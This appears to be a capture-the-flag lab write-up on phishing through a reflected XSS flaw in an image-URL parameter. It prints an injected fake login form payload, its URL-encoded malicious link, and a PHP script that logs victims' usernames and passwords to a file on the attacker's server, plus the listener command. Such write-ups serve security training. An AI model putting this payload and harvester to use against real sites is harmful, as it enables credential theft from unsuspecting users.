
## Phishing Idea

- We start by finding whether this website is vulnerable to XSS.
- We can find what type of XSS vulnerability is present using `xsstrike`. **Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.**
- Create the Payload and set the IP of our own VM to receive the user credentials.
- Setup the Listener first before injecting payload.

---
## Questions and Solutions


- Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.
	- **HTB{redacted}**


I went to the Target URL and opened the Network tab in DevTools and checked the image URL. I copied the URL and used `xsstrike` to find the XSS type.

```bash
python xsstrike.py -u http://10.129.193.193/phishing/index.php?url=test
```

According to `xsstrike` its a Reflected XSS. Below is the JavaScript code we will insert for the `url` parameter value.

```js
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.33><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

We will get our Payload URL after this.

```http
http://10.129.193.193/phishing/index.php?url=document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.15.33%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);
```


Now we need to send the above malicious URL to `/phishing/send.php`. Store the below php script in `/tmp/tmpserver` folder. The below php script will store the user credentials inside the **creds.txt** file if the URL parameter has username and password.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.193.193/phishing/login.php");
    fclose($file);
    exit();
}
?>
```

Setup the listener using the below command.

```bash
sudo php -S 0.0.0.0:80
```

After setting up the listener send the malicious URL to the `/phishing/send.php`, the listener will intercept the credentials and store them in **creds.txt**. Use those credentials to login `/phishing/login.php` and get the flag value.

